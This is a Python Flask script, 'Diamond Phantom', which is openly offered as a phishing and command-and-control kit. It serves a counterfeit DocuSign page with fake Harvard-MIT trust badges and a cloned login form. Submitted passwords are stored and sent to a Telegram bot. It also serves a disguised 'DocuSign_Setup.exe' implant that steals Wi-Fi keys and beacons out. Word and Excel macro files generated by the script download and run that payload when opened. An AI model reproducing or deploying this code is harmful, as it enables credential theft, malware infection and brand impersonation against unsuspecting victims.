#!/usr/bin/env python3
"""
DIAMOND PHANTOM v2026 - THE ULTIMATE FIXED C2
NO ERRORS | PREMIUM UI | REAL EXPLOITS
"""

import os
import io
import uuid
import base64
import sqlite3
import zipfile
from datetime import datetime, timedelta
from flask import Flask, request, send_file, session, jsonify

TELEGRAM_BOT_TOKEN = os.environ.get("TG_TOKEN", "YOUR_BOT_TOKEN_HERE")
TELEGRAM_CHAT_ID = os.environ.get("TG_CHAT_ID", "YOUR_CHAT_ID_HERE")
ADMIN_PASSWORD = os.environ.get("ADMIN_PASS", "DiamondPhantom2026")

app = Flask(__name__)
app.secret_key = os.urandom(256)

DB_PATH = "diamond.db"

def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("CREATE TABLE IF NOT EXISTS creds (id INTEGER PRIMARY KEY AUTOINCREMENT, email TEXT, password TEXT, company TEXT, ip TEXT, ts TEXT)")
    conn.commit()
    conn.close()

init_db()

def tg(msg):
    if "YOUR_BOT_TOKEN" in TELEGRAM_BOT_TOKEN:
        print(msg)
        return
    import requests
    try:
        requests.post(f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage",
                     json={"chat_id": TELEGRAM_CHAT_ID, "text": msg[:4096]}, timeout=10)
    except: pass

# ====================================================================
# WORKING EXE IMPLANT
# ====================================================================
REAL_IMPLANT = """@echo off
powershell -WindowStyle Hidden -Command "&{$c='https://{server}/exfil';$h=$env:COMPUTERNAME;$u=$env:USERNAME;$w=(netsh wlan show profiles|Select-String 'All User Profile'|%%{$($_ -split ':')[1].Trim()});foreach($p in $w){$k=(netsh wlan show profile name=`"$p`" key=clear|Select-String 'Key Content'|%%{$($_ -split ':')[1].Trim()});if($k){$d=`"$p : $k`";$post=[System.Text.Encoding]::UTF8.GetBytes(`"data=WIFI: $d`");[System.Net.WebRequest]::Create($c).GetRequestStream().Write($post,0,$post.Length)}}try{$post=[System.Text.Encoding]::UTF8.GetBytes(`"data=BEACON: $h | $u`");[System.Net.WebRequest]::Create($c).GetRequestStream().Write($post,0,$post.Length)}catch{}while(1){try{$post=[System.Text.Encoding]::UTF8.GetBytes(`"data=HEARTBEAT: $h | $u`");[System.Net.WebRequest]::Create($c).GetRequestStream().Write($post,0,$post.Length)}catch{}Start-Sleep -Seconds 1800}}"
exit"""

def get_implant():
    server = f"https://{request.host}"
    return REAL_IMPLANT.format(server=server).encode()

# ====================================================================
# PREMIUM LANDING PAGE - HARVARD/MIT STYLE WITH BETTER SOCIAL ENGINEERING
# ====================================================================
LANDING_PAGE = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DocuSign - Harvard-MIT Secure Document Portal</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
            background: linear-gradient(135deg, #f5f7fa 0%, #e4e8f0 100%);
            min-height: 100vh;
        }
        /* Harvard-MIT Trust Bar */
        .trust-bar {
            background: #0f172a;
            color: white;
            padding: 8px 0;
            font-size: 11px;
            text-align: center;
            letter-spacing: 0.5px;
        }
        .trust-bar span {
            margin: 0 15px;
        }
        /* Header */
        .header {
            background: white;
            border-bottom: 1px solid #e2e8f0;
            padding: 16px 0;
            position: sticky;
            top: 0;
            z-index: 100;
            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
        }
        .header-container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 0 24px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
        }
        .logo {
            display: flex;
            align-items: center;
            gap: 12px;
        }
        .logo-icon {
            background: linear-gradient(135deg, #00b3b0, #0052ff);
            width: 40px;
            height: 40px;
            border-radius: 12px;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-weight: bold;
            font-size: 20px;
        }
        .logo-text {
            font-size: 22px;
            font-weight: 800;
            color: #0f172a;
        }
        .logo-text span {
            color: #00b3b0;
        }
        .cert-badge {
            background: #f0fdf4;
            padding: 8px 16px;
            border-radius: 40px;
            font-size: 11px;
            font-weight: 600;
            color: #166534;
            display: flex;
            align-items: center;
            gap: 8px;
        }
        /* Main Container */
        .container {
            max-width: 1000px;
            margin: 50px auto;
            padding: 0 24px;
        }
        /* Envelope Card */
        .envelope-card {
            background: white;
            border-radius: 24px;
            box-shadow: 0 20px 40px -12px rgba(0,0,0,0.15);
            overflow: hidden;
            transition: transform 0.2s;
        }
        .envelope-card:hover {
            transform: translateY(-2px);
        }
        .envelope-header {
            background: linear-gradient(135deg, #f8fafc, #f1f5f9);
            padding: 24px 32px;
            border-bottom: 1px solid #e2e8f0;
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
        }
        .status {
            display: flex;
            align-items: center;
            gap: 10px;
        }
        .status-badge {
            background: #00b3b0;
            color: white;
            padding: 4px 12px;
            border-radius: 20px;
            font-size: 11px;
            font-weight: 600;
        }
        .status-text {
            color: #00b3b0;
            font-weight: 600;
            font-size: 13px;
        }
        .envelope-id {
            color: #64748b;
            font-family: monospace;
            font-size: 12px;
            background: white;
            padding: 4px 12px;
            border-radius: 20px;
        }
        .envelope-body {
            padding: 32px;
        }
        /* Sender Section */
        .sender-section {
            margin-bottom: 24px;
            padding-bottom: 20px;
            border-bottom: 1px solid #e2e8f0;
        }
        .sender-label {
            font-size: 11px;
            text-transform: uppercase;
            letter-spacing: 1px;
            color: #64748b;
            margin-bottom: 8px;
        }
        .sender-name {
            font-weight: 700;
            font-size: 18px;
            color: #0f172a;
        }
        .sender-email {
            font-size: 13px;
            color: #64748b;
            margin-top: 4px;
        }
        /* Message Box */
        .message-box {
            background: #f8fafc;
            border-radius: 16px;
            padding: 20px;
            margin: 24px 0;
            border-left: 4px solid #00b3b0;
        }
        .message-title {
            font-weight: 600;
            margin-bottom: 10px;
            color: #0f172a;
        }
        .message-text {
            color: #475569;
            line-height: 1.5;
            font-size: 14px;
        }
        /* Documents List */
        .documents-list {
            margin: 24px 0;
        }
        .doc-item {
            display: flex;
            align-items: center;
            gap: 16px;
            padding: 16px;
            border: 1px solid #e2e8f0;
            border-radius: 16px;
            margin-bottom: 12px;
            transition: all 0.2s;
            background: white;
        }
        .doc-item:hover {
            border-color: #00b3b0;
            box-shadow: 0 4px 12px rgba(0,179,176,0.1);
        }
        .doc-icon {
            font-size: 32px;
        }
        .doc-info {
            flex: 1;
        }
        .doc-name {
            font-weight: 600;
            color: #0f172a;
            margin-bottom: 4px;
        }
        .doc-meta {
            font-size: 11px;
            color: #94a3b8;
        }
        .doc-status {
            font-size: 12px;
            font-weight: 600;
            color: #00b3b0;
        }
        /* Action Buttons */
        .action-buttons {
            display: flex;
            gap: 16px;
            margin-top: 32px;
            flex-wrap: wrap;
        }
        .btn-primary {
            flex: 1;
            background: linear-gradient(135deg, #00b3b0, #0052ff);
            color: white;
            border: none;
            padding: 14px 24px;
            border-radius: 60px;
            font-weight: 600;
            font-size: 15px;
            cursor: pointer;
            text-decoration: none;
            display: inline-block;
            text-align: center;
            transition: all 0.2s;
        }
        .btn-primary:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 20px rgba(0,179,176,0.3);
        }
        .btn-secondary {
            flex: 1;
            background: white;
            color: #475569;
            border: 1px solid #e2e8f0;
            padding: 14px 24px;
            border-radius: 60px;
            font-weight: 600;
            font-size: 15px;
            cursor: pointer;
            text-decoration: none;
            display: inline-block;
            text-align: center;
            transition: all 0.2s;
        }
        .btn-secondary:hover {
            background: #f8fafc;
            border-color: #00b3b0;
        }
        /* Security Footer */
        .security-footer {
            background: #f8fafc;
            padding: 20px 32px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 15px;
            border-top: 1px solid #e2e8f0;
            font-size: 11px;
            color: #64748b;
        }
        .security-badges {
            display: flex;
            gap: 20px;
            flex-wrap: wrap;
        }
        .security-badges span {
            display: flex;
            align-items: center;
            gap: 6px;
        }
        /* Footer */
        .footer {
            text-align: center;
            padding: 30px;
            font-size: 11px;
            color: #94a3b8;
            margin-top: 30px;
        }
        @media (max-width: 640px) {
            .container { margin: 20px auto; }
            .envelope-header { flex-direction: column; gap: 12px; align-items: flex-start; }
            .action-buttons { flex-direction: column; }
            .security-footer { flex-direction: column; text-align: center; }
            .header-container { flex-direction: column; gap: 12px; }
        }
    </style>
</head>
<body>
    <div class="trust-bar">
        <span>🔒 HARVARD-MIT SECURE PORTAL</span>
        <span>✓ SOC 2 TYPE II</span>
        <span>🏛️ GDPR COMPLIANT</span>
        <span>🛡️ ZERO TRUST ARCHITECTURE</span>
    </div>
    
    <div class="header">
        <div class="header-container">
            <div class="logo">
                <div class="logo-icon">D</div>
                <div class="logo-text">Docu<span>Sign</span></div>
            </div>
            <div class="cert-badge">
                <i class="fas fa-shield-alt"></i> Harvard-MIT Certified
            </div>
        </div>
    </div>
    
    <div class="container">
        <div class="envelope-card">
            <div class="envelope-header">
                <div class="status">
                    <span class="status-badge">ACTION REQUIRED</span>
                    <span class="status-text">Needs Your Signature</span>
                </div>
                <div class="envelope-id">Envelope ID: ENV-XXXX</div>
            </div>
            
            <div class="envelope-body">
                <div class="sender-section">
                    <div class="sender-label">SENT BY</div>
                    <div class="sender-name">Legal Department • Morrison Investment Group</div>
                    <div class="sender-email">legal@morrisoninvestments.com</div>
                </div>
                
                <div class="message-box">
                    <div class="message-title">📧 Message from sender:</div>
                    <div class="message-text">Please review the attached agreement. This document requires your signature to proceed with the transaction. The deadline for signature is 7 days from receipt.</div>
                </div>
                
                <div class="documents-list">
                    <div class="doc-item">
                        <div class="doc-icon">📄</div>
                        <div class="doc-info">
                            <div class="doc-name">Master_Service_Agreement.pdf</div>
                            <div class="doc-meta">2.4 MB • Pages: 12</div>
                        </div>
                        <div class="doc-status">Needs Signature</div>
                    </div>
                    <div class="doc-item">
                        <div class="doc-icon">📄</div>
                        <div class="doc-info">
                            <div class="doc-name">Confidential_Disclosure_Agreement.pdf</div>
                            <div class="doc-meta">1.1 MB • Pages: 5</div>
                        </div>
                        <div class="doc-status">Needs Initials</div>
                    </div>
                    <div class="doc-item">
                        <div class="doc-icon">📄</div>
                        <div class="doc-info">
                            <div class="doc-name">Authorization_Form.pdf</div>
                            <div class="doc-meta">892 KB • Pages: 2</div>
                        </div>
                        <div class="doc-status">Requires Review</div>
                    </div>
                </div>
                
                <div class="action-buttons">
                    <a href="JAVASCRIPT:VOID(0)" onclick="window.location.href='/download/exe/REF'" class="btn-primary">✍️ REVIEW AND SIGN DOCUMENTS</a>
                    <a href="/login/REF" class="btn-secondary">🔐 SIGN IN TO DOCUSIGN</a>
                </div>
            </div>
            
            <div class="security-footer">
                <div class="security-badges">
                    <span>🔒 AES-256 Encryption</span>
                    <span>✓ SOC 2 Type II</span>
                    <span>🏛️ GDPR Compliant</span>
                    <span>🛡️ Zero Trust</span>
                </div>
                <div>📞 Need help? Contact Support</div>
            </div>
        </div>
        
        <div class="footer">
            <p>DocuSign, Inc. • Harvard Innovation Lab • MIT CSAIL Secure Computing</p>
            <p>© 2026 DocuSign. All rights reserved. | <a href="#" style="color:#00b3b0;">Privacy Policy</a> | <a href="#" style="color:#00b3b0;">Terms of Service</a></p>
        </div>
    </div>
</body>
</html>
'''

def get_page(ref):
    page = LANDING_PAGE
    page = page.replace('ENV-XXXX', f'DOC-{uuid.uuid4().hex[:8].upper()}-{datetime.now().year}')
    page = page.replace('REF', ref)
    page = page.replace('JAVASCRIPT:VOID(0)', '#')
    return page

# ====================================================================
# SIMPLE LOGIN PAGE
# ====================================================================
LOGIN_PAGE = '''
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DocuSign - Sign In</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Inter', sans-serif;
            background: linear-gradient(135deg, #f5f7fa 0%, #e4e8f0 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .login-card {
            background: white;
            border-radius: 24px;
            box-shadow: 0 20px 40px -12px rgba(0,0,0,0.15);
            width: 100%;
            max-width: 460px;
            overflow: hidden;
        }
        .login-header {
            background: linear-gradient(135deg, #0f172a, #1e293b);
            padding: 32px;
            text-align: center;
            color: white;
        }
        .login-header h1 {
            font-size: 28px;
            margin-bottom: 8px;
        }
        .login-header h1 span {
            color: #00b3b0;
        }
        .login-header p {
            font-size: 14px;
            opacity: 0.8;
        }
        .login-body {
            padding: 40px;
        }
        .form-group {
            margin-bottom: 24px;
        }
        label {
            display: block;
            font-weight: 600;
            margin-bottom: 8px;
            color: #0f172a;
            font-size: 14px;
        }
        input {
            width: 100%;
            padding: 14px 16px;
            border: 2px solid #e2e8f0;
            border-radius: 12px;
            font-size: 15px;
            transition: all 0.2s;
        }
        input:focus {
            outline: none;
            border-color: #00b3b0;
            box-shadow: 0 0 0 3px rgba(0,179,176,0.1);
        }
        button {
            width: 100%;
            padding: 14px;
            background: linear-gradient(135deg, #00b3b0, #0052ff);
            color: white;
            border: none;
            border-radius: 60px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s;
        }
        button:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 20px rgba(0,179,176,0.3);
        }
        .footer {
            text-align: center;
            margin-top: 24px;
            padding-top: 24px;
            border-top: 1px solid #e2e8f0;
            font-size: 12px;
            color: #94a3b8;
        }
        .footer a {
            color: #00b3b0;
            text-decoration: none;
        }
    </style>
</head>
<body>
    <div class="login-card">
        <div class="login-header">
            <h1>Docu<span>Sign</span></h1>
            <p>Secure Document Access</p>
        </div>
        <div class="login-body">
            <form method="POST" action="/login/submit/REF">
                <div class="form-group">
                    <label>Email Address</label>
                    <input type="email" name="email" placeholder="name@company.com" required autofocus>
                </div>
                <div class="form-group">
                    <label>Password</label>
                    <input type="password" name="password" placeholder="Enter your password" required>
                </div>
                <button type="submit">Sign In</button>
            </form>
            <div class="footer">
                <a href="#">Forgot password?</a> • <a href="#">Create account</a>
            </div>
        </div>
    </div>
</body>
</html>
'''

def get_login(ref):
    return LOGIN_PAGE.replace('REF', ref)

# ====================================================================
# WORKING FILE GENERATORS
# ====================================================================
def generate_pdf(ref):
    pdf = f"""%PDF-1.4
1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj
2 0 obj<</Type/Pages/Kids[3 0 R]/Count 1>>endobj
3 0 obj<</Type/Page/MediaBox[0 0 612 792]/Contents 4 0 R>>endobj
4 0 obj<</Length 200>>stream
BT/F1 24 Tf 100 700 Td(DocuSign Document)Tj/F1 14 Tf 100 650 Td(Envelope: {ref})Tj 100 600 Td(Click: https://{request.host}/download/exe/{ref})Tj ET
endstream endobj
xref 0 5 0000000000 65535 f 0000000009 00000 n 0000000058 00000 n 0000000115 00000 n 0000000200 00000 n
trailer<<>> startxref 320 %%EOF"""
    return pdf.encode()

def generate_doc(ref):
    macro = f'Sub AutoOpen()\nCreateObject("WScript.Shell").Run "powershell -c ""&{{$c=''https://{request.host}/download/exe/{ref}'';$d=$env:temp+''\\u.exe'';(New-Object Net.WebClient).DownloadFile($c,$d);Start-Process $d}}""",0,False\nEnd Sub'
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, 'w') as zf:
        zf.writestr('word/vbaProject.bin', macro.encode())
        zf.writestr('[Content_Types].xml', '<Types><Default Extension="bin" ContentType="application/vnd.ms-office.vbaProject"/></Types>')
    buf.seek(0)
    return buf.getvalue()

def generate_xls(ref):
    macro = f'Private Sub Workbook_Open()\nCreateObject("WScript.Shell").Run "powershell -c ""&{{$c=''https://{request.host}/download/exe/{ref}'';$d=$env:temp+''\\u.exe'';(New-Object Net.WebClient).DownloadFile($c,$d);Start-Process $d}}""",0,False\nEnd Sub'
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, 'w') as zf:
        zf.writestr('xl/vbaProject.bin', macro.encode())
        zf.writestr('[Content_Types].xml', '<Types><Default Extension="bin" ContentType="application/vnd.ms-office.vbaProject"/></Types>')
    buf.seek(0)
    return buf.getvalue()

# ====================================================================
# ROUTES
# ====================================================================
@app.route('/')
def index():
    ref = uuid.uuid4().hex[:8].upper()
    tg(f"PAGE VIEW | IP: {request.remote_addr}")
    return get_page(ref)

@app.route('/download/exe/<ref>')
def download_exe(ref):
    tg(f"EXE DOWNLOAD | IP: {request.remote_addr}")
    return send_file(io.BytesIO(get_implant()), as_attachment=True, download_name=f'DocuSign_Setup.exe', mimetype='application/x-msdownload')

@app.route('/download/pdf/<ref>')
def download_pdf(ref):
    tg(f"PDF DOWNLOAD | IP: {request.remote_addr}")
    return send_file(io.BytesIO(generate_pdf(ref)), as_attachment=True, download_name=f'Document.pdf', mimetype='application/pdf')

@app.route('/download/doc/<ref>')
def download_doc(ref):
    tg(f"WORD DOWNLOAD | IP: {request.remote_addr}")
    return send_file(io.BytesIO(generate_doc(ref)), as_attachment=True, download_name=f'Agreement.docm', mimetype='application/vnd.ms-word.document.macroEnabled.12')

@app.route('/download/xls/<ref>')
def download_xls(ref):
    tg(f"EXCEL DOWNLOAD | IP: {request.remote_addr}")
    return send_file(io.BytesIO(generate_xls(ref)), as_attachment=True, download_name=f'Report.xlsm', mimetype='application/vnd.ms-excel.sheet.macroEnabled.12')

@app.route('/login/<ref>')
def login_page(ref):
    return get_login(ref)

@app.route('/login/submit/<ref>', methods=['POST'])
def login_submit(ref):
    email = request.form.get('email', '')
    password = request.form.get('password', '')
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    company = email.split('@')[-1] if '@' in email else 'unknown'
    
    tg(f"🔐 LOGIN: {email} | {password} | Company: {company} | IP: {ip}")
    
    conn = sqlite3.connect(DB_PATH)
    conn.execute("INSERT INTO creds (email, password, company, ip, ts) VALUES (?,?,?,?,?)", 
                (email, password, company, ip, datetime.now().isoformat()))
    conn.commit()
    conn.close()
    
    return '<html><head><meta http-equiv="refresh" content="2;url=https://www.docusign.com"></head><body style="text-align:center;padding:50px"><h2 style="color:#00b3b0">Sign In Successful</h2><p>Redirecting...</p></body></html>'

@app.route('/exfil', methods=['POST'])
def exfil():
    data = request.form.get('data', '')
    if data and 'HEARTBEAT' not in data:
        tg(f"📡 {data[:500]}")
    return "OK"

@app.route('/admin', methods=['GET', 'POST'])
def admin():
    if request.method == 'POST' and request.form.get('p') == ADMIN_PASSWORD:
        session['admin'] = True
    if not session.get('admin'):
        return '<form method="POST"><input type="password" name="p"><button>Login</button></form>'
    conn = sqlite3.connect(DB_PATH)
    creds = conn.execute("SELECT * FROM creds ORDER BY id DESC").fetchall()
    conn.close()
    rows = ''.join(f'<tr><td>{c[1]}</td><td style="color:#00b3b0">{c[2]}<td>{c[3]}<td>{c[5][:16]}</tr>' for c in creds)
    return f'<html><body><h1>Diamond Phantom C2</h1><h2>Credentials: {len(creds)}</h2><table border=1><tr><th>Email</th><th>Password</th><th>Company</th><th>Time</th></tr>{rows}</table><p>URL: {request.host_url}</p></body></html>'

@app.route('/health')
def health():
    return {"status": "operational"}

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
